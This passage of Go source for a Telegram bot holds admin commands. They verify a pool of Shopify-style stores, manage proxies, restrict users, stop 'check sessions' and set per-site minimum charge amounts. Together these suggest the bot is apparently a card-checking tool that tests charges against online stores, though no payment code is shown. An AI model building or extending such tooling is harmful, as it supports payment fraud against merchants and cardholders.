		msgText := fmt.Sprintf("✅ Working: %d\n❌ Failed: %d\n\n", len(working), len(failed))
		if len(working) > 0 {
			// Send working sites as a file
			workingBuf := bytes.NewBufferString(strings.Join(working, "\n"))
			workingDoc := &tele.Document{
				File:     tele.FromReader(workingBuf),
				FileName: "working_sites.txt",
				Caption:  fmt.Sprintf("✅ Working sites (%d/%d)", len(working), len(urls)),
			}
			bot.Send(c.Chat(), workingDoc)
		}
		return c.Send(msgText)
	})

	// ── /verify — verify all sites in pool ──
	bot.Handle("/verify", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		sites := getSitePool()
		if len(sites) == 0 {
			return c.Send("❌ No sites in pool to verify.")
		}

		c.Send(fmt.Sprintf("🔄 Verifying %d site(s)...", len(sites)))

		var working []string
		cl := &http.Client{Timeout: 10 * time.Second}
		for _, site := range sites {
			resp, err := cl.Get(site + "/products.json?limit=1")
			if err != nil {
				continue
			}
			resp.Body.Close()
			if resp.StatusCode == 200 {
				working = append(working, site)
			}
		}

		// Send all sites file
		allBuf := bytes.NewBufferString(strings.Join(sites, "\n"))
		allDoc := &tele.Document{
			File:     tele.FromReader(allBuf),
			FileName: "all_sites.txt",
			Caption:  fmt.Sprintf("📋 All sites (%d)", len(sites)),
		}
		bot.Send(c.Chat(), allDoc)

		// Send working sites file
		workingBuf := bytes.NewBufferString(strings.Join(working, "\n"))
		workingDoc := &tele.Document{
			File:     tele.FromReader(workingBuf),
			FileName: "working_sites.txt",
			Caption:  fmt.Sprintf("✅ Working sites (%d/%d)", len(working), len(sites)),
		}
		bot.Send(c.Chat(), workingDoc)

		return c.Send(fmt.Sprintf("✅ Verification complete: %d/%d working", len(working), len(sites)))
	})

	// ── /broadcastuser <user_id|@username> <message> ──
	bot.Handle("/broadcastuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		fullText := c.Message().Text
		parts := strings.SplitN(fullText, " ", 3)
		if len(parts) < 3 {
			return c.Send("Usage: /broadcastuser <user_id|@username> <message>")
		}
		target := parts[1]
		bmsg := parts[2]

		var uid int64
		if strings.HasPrefix(target, "@") {
			username := strings.ToLower(strings.TrimPrefix(target, "@"))
			usernameRegistryMu.RLock()
			id, ok := usernameRegistry[username]
			usernameRegistryMu.RUnlock()
			if !ok {
				return c.Send("❌ Username not found in registry. Use user ID instead.")
			}
			uid = id
		} else {
			var err error
			uid, err = strconv.ParseInt(target, 10, 64)
			if err != nil {
				return c.Send("❌ Invalid user ID")
			}
		}

		_, err := bot.Send(tele.ChatID(uid), "📢 "+bmsg)
		if err != nil {
			return c.Send(fmt.Sprintf("❌ Failed to send: %v", err))
		}
		return c.Send(fmt.Sprintf("✅ Message sent to %d", uid))
	})

	// ── /broadcastactive <message> ──
	bot.Handle("/broadcastactive", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		fullText := c.Message().Text
		idx := strings.Index(fullText, " ")
		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
			return c.Send("Usage: /broadcastactive <message>")
		}
		bmsg := strings.TrimSpace(fullText[idx:])
		sent, failed := 0, 0
		activeSessions.Range(func(key, _ any) bool {
			uid := key.(int64)
			_, err := bot.Send(tele.ChatID(uid), "📢 "+bmsg)
			if err != nil {
				failed++
			} else {
				sent++
			}
			return true
		})
		return c.Send(fmt.Sprintf("📢 Broadcast to active users\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
	})

	// ── /restrict ──
	bot.Handle("/restrict", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /restrict all  or  /restrict <user_id>[, ...]")
		}
		if strings.ToLower(raw) == "all" {
			cfg.mu.Lock()
			cfg.RestrictAll = true
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send("🔒 Bot restricted to admins only.")
		}
		ids := parseIDList(raw)
		if len(ids) == 0 {
			return c.Send("❌ No valid user IDs provided")
		}
		cfg.mu.Lock()
		for _, id := range ids {
			cfg.RestrictedUsers[id] = true
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("🔒 Restricted %d user(s).", len(ids)))
	})

	// ── /allowonly ──
	bot.Handle("/allowonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /allowonly <id>[, ...]")
		}
		ids := parseIDList(raw)
		if len(ids) == 0 {
			return c.Send("❌ No valid IDs provided")
		}
		cfg.mu.Lock()
		for _, id := range ids {
			cfg.AllowOnlyIDs[id] = true
		}
		total := len(cfg.AllowOnlyIDs)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Allow-only list updated. %d ID(s) total.", total))
	})

	// ── /unrestrict ──
	bot.Handle("/unrestrict", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /unrestrict all  or  /unrestrict <user_id>[, ...]")
		}
		if strings.ToLower(raw) == "all" {
			cfg.mu.Lock()
			cfg.RestrictAll = false
			cfg.RestrictedUsers = make(map[int64]bool)
			cfg.AllowOnlyIDs = make(map[int64]bool)
			cfg.mu.Unlock()
			cfg.Save()
			return c.Send("🔓 All restrictions lifted. Cleared restrict-all, restricted users, and allow-only list.")
		}
		ids := parseIDList(raw)
		if len(ids) == 0 {
			return c.Send("❌ No valid user IDs provided")
		}
		cfg.mu.Lock()
		for _, id := range ids {
			delete(cfg.RestrictedUsers, id)
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Unrestricted %d user(s).", len(ids)))
	})

	// ── /rmuser — remove from allowed bypass list ──
	bot.Handle("/rmuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmuser <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cfg.mu.Lock()
		delete(cfg.AllowedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d removed from bypass list.", uid))
	})

	// ── /users — list all users in allowuser bypass list ──
	bot.Handle("/users", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		cfg.mu.RLock()
		type userEntry struct {
			ID     int64
			Expiry int64
		}
		entries := make([]userEntry, 0, len(cfg.AllowedUsers))
		for id, exp := range cfg.AllowedUsers {
			entries = append(entries, userEntry{ID: id, Expiry: exp})
		}
		cfg.mu.RUnlock()
		if len(entries) == 0 {
			return c.Send("📝 No users in allowed list.")
		}
		sort.Slice(entries, func(i, j int) bool { return entries[i].ID < entries[j].ID })
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("👥 Allowed users (%d):\n\n", len(entries)))
		for i, e := range entries {
			if e.Expiry == 0 {
				sb.WriteString(fmt.Sprintf("%d. %d — ♾ permanent\n", i+1, e.ID))
			} else {
				expTime := time.Unix(e.Expiry, 0)
				if time.Now().After(expTime) {
					sb.WriteString(fmt.Sprintf("%d. %d — ⏰ EXPIRED\n", i+1, e.ID))
				} else {
					remaining := time.Until(expTime).Truncate(time.Minute)
					sb.WriteString(fmt.Sprintf("%d. %d — ⏳ %s left\n", i+1, e.ID, remaining))
				}
			}
		}
		return c.Send(sb.String())
	})

	// ── /admins — show all admin IDs ──
	bot.Handle("/admins", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		var ids []int64
		for id := range adminIDs {
			ids = append(ids, id)
		}
		sort.Slice(ids, func(i, j int) bool { return ids[i] < ids[j] })
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("👑 Admins (%d):\n\n", len(ids)))
		for i, id := range ids {
			tag := ""
			if originalAdminIDs[id] {
				tag = " (owner)"
			}
			sb.WriteString(fmt.Sprintf("%d. %d%s\n", i+1, id, tag))
		}
		return c.Send(sb.String())
	})

	// ── /addadmin ──
	bot.Handle("/addadmin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /addadmin <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		if adminIDs[uid] {
			return c.Send("⚠️ Already an admin.")
		}
		adminIDs[uid] = true
		cfg.mu.Lock()
		cfg.DynamicAdmins[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d is now an admin.", uid))
	})

	// ── /rmadmin ──
	bot.Handle("/rmadmin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmadmin <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		if originalAdminIDs[uid] {
			return c.Send("❌ Cannot remove an owner admin.")
		}
		if !adminIDs[uid] {
			return c.Send("⚠️ User is not an admin.")
		}
		delete(adminIDs, uid)
		cfg.mu.Lock()
		delete(cfg.DynamicAdmins, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d removed from admins.", uid))
	})

	// ── /giveperm <user_id> <command> ──
	bot.Handle("/giveperm", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		parts := strings.Fields(c.Message().Payload)
		if len(parts) < 2 {
			return c.Send("Usage: /giveperm <user_id> <command>")
		}
		uid, err := strconv.ParseInt(parts[0], 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cmd := strings.TrimPrefix(parts[1], "/")
		cfg.mu.Lock()
		if cfg.UserPerms[uid] == nil {
			cfg.UserPerms[uid] = make(map[string]bool)
		}
		cfg.UserPerms[uid][cmd] = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d granted /%s permission.", uid, cmd))
	})

	// ── /addgp <group_id>[, ...] ──
	bot.Handle("/addgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /addgp <group_id>[, ...]")
		}
		ids := parseIDList(raw)
		if len(ids) == 0 {
			return c.Send("❌ No valid group IDs provided")
		}
		cfg.mu.Lock()
		for _, id := range ids {
			cfg.AllowedGroups[id] = true
		}
		total := len(cfg.AllowedGroups)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Added %d group(s). Total: %d", len(ids), total))
	})

	// ── /showgp — show allowed groups ──
	bot.Handle("/showgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		cfg.mu.RLock()
		groupsOnly := cfg.GroupsOnly
		groups := make([]int64, 0, len(cfg.AllowedGroups))
		for id := range cfg.AllowedGroups {
			groups = append(groups, id)
		}
		cfg.mu.RUnlock()

		mode := "OFF"
		if groupsOnly {
			mode = "ON"
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("🏷 Groups-only mode: %s\n\n", mode))
		if len(groups) == 0 {
			sb.WriteString("📝 No groups configured.")
		} else {
			sort.Slice(groups, func(i, j int) bool { return groups[i] < groups[j] })
			sb.WriteString(fmt.Sprintf("Allowed groups (%d):\n", len(groups)))
			for i, id := range groups {
				sb.WriteString(fmt.Sprintf("%d. %d\n", i+1, id))
			}
		}
		return c.Send(sb.String())
	})

	// ── /delgp <group_id>[, ...] ──
	bot.Handle("/delgp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /delgp <group_id>[, ...]")
		}
		ids := parseIDList(raw)
		if len(ids) == 0 {
			return c.Send("❌ No valid group IDs provided")
		}
		cfg.mu.Lock()
		for _, id := range ids {
			delete(cfg.AllowedGroups, id)
		}
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Removed %d group(s).", len(ids)))
	})

	// ── /onlygp — enable groups-only mode ──
	bot.Handle("/onlygp", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		cfg.mu.Lock()
		cfg.GroupsOnly = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send("🔒 Groups-only mode enabled. Bot will only work in allowed groups.\nUse /addgp to add groups, /allowuser to whitelist PM users.")
	})

	// ── /allowall — disable groups-only mode ──
	bot.Handle("/allowall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		cfg.mu.Lock()
		cfg.GroupsOnly = false
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send("🔓 Groups-only mode disabled. Bot works everywhere.")
	})

	// ── /show <user_id> — admin show user proxies ──
	bot.Handle("/show", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /show <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send(fmt.Sprintf("📝 User %d has no proxies.", uid))
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("🌐 Proxies for user %d (%d):\n\n", uid, len(ud.Proxies)))
		for i, p := range ud.Proxies {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, p))
		}
		return c.Send(sb.String())
	})

	// ── /chkpr <user_id> — admin check user proxies ──
	bot.Handle("/chkpr", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /chkpr <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send(fmt.Sprintf("📝 User %d has no proxies.", uid))
		}
		c.Send(fmt.Sprintf("🔄 Testing %d proxy(s) for user %d...", len(ud.Proxies), uid))

		type proxyResult struct {
			idx     int
			proxy   string
			working bool
		}
		resultsCh := make(chan proxyResult, len(ud.Proxies))
		var wg sync.WaitGroup
		for i, p := range ud.Proxies {
			wg.Add(1)
			go func(idx int, proxy string) {
				defer wg.Done()
				resultsCh <- proxyResult{idx: idx, proxy: proxy, working: testProxy(proxy) == nil}
			}(i, p)
		}
		wg.Wait()
		close(resultsCh)

		working := 0
		failed := 0
		var failedList []string
		for r := range resultsCh {
			if r.working {
				working++
			} else {
				failed++
				failedList = append(failedList, fmt.Sprintf("%d. %s", r.idx+1, r.proxy))
			}
		}
		resultMsg := fmt.Sprintf("✅ Working: %d\n❌ Failed: %d", working, failed)
		if len(failedList) > 0 {
			resultMsg += "\n\nFailed proxies:\n" + strings.Join(failedList, "\n")
		}
		return c.Send(resultMsg)
	})

	// ── /cleanproxies — clean all invalid proxies from all users ──
	bot.Handle("/cleanproxies", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		c.Send("🔄 Cleaning invalid proxies from all users... This may take a while.")

		// Collect all user proxies outside the lock
		type userProxies struct {
			uid     int64
			proxies []string
		}
		um.mu.RLock()
		var allUsers []userProxies
		for uid, ud := range um.users {
			if len(ud.Proxies) > 0 {
				cp := make([]string, len(ud.Proxies))
				copy(cp, ud.Proxies)
				allUsers = append(allUsers, userProxies{uid: uid, proxies: cp})
			}
		}
		um.mu.RUnlock()

		totalRemoved := 0
		usersAffected := 0

		for _, up := range allUsers {
			// Test all proxies for this user concurrently
			results := make([]bool, len(up.proxies))
			var wg sync.WaitGroup
			for i, p := range up.proxies {
				wg.Add(1)
				go func(idx int, proxy string) {
					defer wg.Done()
					results[idx] = testProxy(proxy) == nil
				}(i, p)
			}
			wg.Wait()

			var valid []string
			removed := 0
			for i, ok := range results {
				if ok {
					valid = append(valid, up.proxies[i])
				} else {
					removed++
				}
			}
			if removed > 0 {
				ud := um.Get(up.uid)
				ud.Proxies = valid
				totalRemoved += removed
				usersAffected++
				fmt.Printf("[CLEANPROXIES] Removed %d dead proxies from user %d\n", removed, up.uid)
			}
		}
		um.Save()

		return c.Send(fmt.Sprintf("✅ Cleanup complete\n🗑 Removed: %d proxies\n👥 Users affected: %d", totalRemoved, usersAffected))
	})

	// ── /stopuser <user_id> ──
	bot.Handle("/stopuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /stopuser <user_id>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		val, ok := activeSessions.Load(uid)
		if !ok {
			return c.Send(fmt.Sprintf("⚠️ No active session for user %d", uid))
		}
		sess := val.(*CheckSession)
		sess.Cancel()
		return c.Send(fmt.Sprintf("✅ Stopped session for user %d (@%s)", uid, sess.Username))
	})

	// ── /resetactive — reset all active checks ──
	bot.Handle("/resetactive", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancel()
			activeSessions.Delete(key)
			count++
			return true
		})
		if count == 0 {
			return c.Send("⚠️ No active sessions.")
		}
		return c.Send(fmt.Sprintf("✅ Reset %d active session(s).", count))
	})

	// ── /reboot — reboot the bot ──
	bot.Handle("/reboot", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		c.Send("🔄 Rebooting bot... Sessions will be lost.")
		um.Save()
		cfg.Save()
		saveCustomSites()

		exe, err := os.Executable()
		if err != nil {
			return c.Send("❌ Failed to find executable: " + err.Error())
		}
		syscall.Exec(exe, os.Args, os.Environ())
		return nil
	})

	// ── /setprice <site_url> <amount> — set minimum charge for a site ──
	bot.Handle("/setprice", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		parts := strings.Fields(c.Message().Payload)
		if len(parts) < 2 {
			return c.Send("Usage: /setprice <site_url> <amount>")
		}
		site := strings.TrimRight(parts[0], "/")
		if !strings.HasPrefix(site, "http") {
			site = "https://" + site
		}
		amount, err := strconv.ParseFloat(parts[1], 64)
		if err != nil {
			return c.Send("❌ Invalid amount")
		}
		cfg.mu.Lock()
		cfg.SitePrices[site] = amount
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ Set minimum charge for %s: $%.2f", site, amount))
	})

	fwd.BindRCtx(bot)

	fmt.Println("Bot started")
	bot.Start()
}
